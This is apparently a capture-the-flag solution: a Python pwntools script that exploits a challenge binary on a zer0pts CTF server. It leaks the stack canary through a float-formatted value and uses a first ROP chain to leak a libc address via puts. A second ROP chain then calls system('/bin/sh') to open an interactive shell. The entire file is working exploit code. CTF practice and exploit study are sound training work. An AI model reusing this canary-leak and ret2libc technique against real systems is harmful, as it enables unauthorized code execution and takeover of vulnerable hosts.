#!/usr/bin/python

from pwn import *
import sys
import struct

remote_ip, port = 'pwn.ctf.zer0pts.com', 9002
binary = './chall'
brkpts = '''
b *0x400916
'''

elf = ELF("chall")
libc = ELF("libc.so.6")

#context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

pop_rdi = 0x400e93
got = 0x601ee8
puts_plt = 0x4006d0
main = 0x40089b

if __name__ == "__main__":
    #gdb.attach(io, brkpts)
    sla("> ", "a")
    sla("> ", "28")
    sla("Time[sec]: ", ".")
    reu("as close to ")
    val = float(reu(" seconds"))
    canary = u64(struct.pack('<d', val))
    log.info("Canary : "+hex(canary))
    sl("")
    sleep(0.2)
    sl("")
    payload = "Y"*0x18
    payload += flat([
        canary,
        0xdeadbeef,
        pop_rdi,
        got,
        puts_plt,
        main
    ])
    sla("(Y/n) ", payload)
    libc.address = u64(io.recv(6).ljust(8,"\x00")) - 0x61c140
    log.info("Libc : "+hex(libc.address))
    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))
    payload = p64(canary)*5
    payload += flat([
        pop_rdi,
        binsh,
        system
    ])
    sla("(Y/n) ", payload)
    io.interactive()
